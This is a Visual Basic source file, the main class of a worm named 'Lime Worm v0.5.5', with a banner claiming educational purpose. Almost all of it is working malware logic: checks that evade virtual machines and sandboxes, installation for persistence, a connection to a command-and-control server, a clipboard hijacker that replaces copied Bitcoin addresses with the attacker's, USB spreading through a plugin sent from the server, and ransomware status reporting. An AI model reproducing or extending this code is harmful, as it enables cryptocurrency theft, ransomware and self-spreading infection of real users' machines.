
'##################################################################
'##        N Y A N   C A T  |||   Updated on May./01/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                     .. Lime Worm v0.5.5 ..                   ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################


Imports System.Threading

Public Class Main
    Public Shared C As New TCP
    Public Shared SPL = "|'L'|"

    Public Shared Sub Main()

        Thread.Sleep(1000)

        Dim createdNew As Boolean 'Making sure that only 1 process is running
        Settings.NMT = New Mutex(True, Settings.MTX, createdNew)
        Try
            If Not createdNew Then End
        Finally
            If createdNew Then
                Settings.NMT.ReleaseMutex()
            End If
        End Try

        If Settings.ANTI Then
            Call VMware()
            Call Virtualbox()
            Call Sandboxie()
            Call Win_XP()
        End If

        Call Installation.INS()

        TCP.CON() 'Start TCP connection to server

        If Settings.BTC_ADDR.Length > 25 Then
            Dim _BTC As Thread = New Thread(AddressOf _BTC_ST)
            _BTC.SetApartmentState(ApartmentState.STA)
            _BTC.Start()
        End If

        If Settings.USB Then
            Dim _USB As Thread = New Thread(AddressOf StartSP)
            _USB.Start()
        End If

        Dim CHK As Thread = New Thread(AddressOf Checking)
        CHK.Start()

    End Sub

    Private Shared Sub Checking()
        Thread.CurrentThread.Sleep(5000)
        Dim Old As String = GTV("Ransome-Status")
        Dim Old2 As String = GTV("USB")

1:
        Try

            While True
                'Compare old string with new string

                If Old <> GTV("Ransome-Status").ToString Then
                    Old = GTV("Ransome-Status")
                    C.Send("!R" & SPL & GTV("Ransome-Status").ToString)
                End If

                If Settings.USB Then
                    If Old2 <> GTV("USB").ToString Then
                        Old2 = GTV("USB")
                        C.Send("!U" & SPL & GTV("USB").ToString)
                    End If
                End If
                Thread.CurrentThread.Sleep(3000)
            End While
        Catch ex As Exception
            GoTo 1
        End Try
    End Sub

    Private Shared Sub _BTC_ST()
        While True
            Try

                Thread.CurrentThread.Sleep(1500)

                'check if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
                'the length is between 26-35 characters
                'more info https://en.bitcoin.it/wiki/Address

                If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 35 Then
                    If My.Computer.Clipboard.GetText.StartsWith("1") Or My.Computer.Clipboard.GetText.StartsWith("3") Or My.Computer.Clipboard.GetText.StartsWith("bc1") Then
                        My.Computer.Clipboard.SetText(Settings.BTC_ADDR)
                    End If
                End If
            Catch ex As Exception
            End Try
        End While
    End Sub

    Private Shared Sub StartSP()

        If GTV("_USB") = Nothing Then
            While True
                Thread.CurrentThread.Sleep(5000)
                If C.CNT = True Then
                    C.Send("PLUSB")
                    Exit While
                End If
            End While

        Else
            Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
        End If

    End Sub

End Class

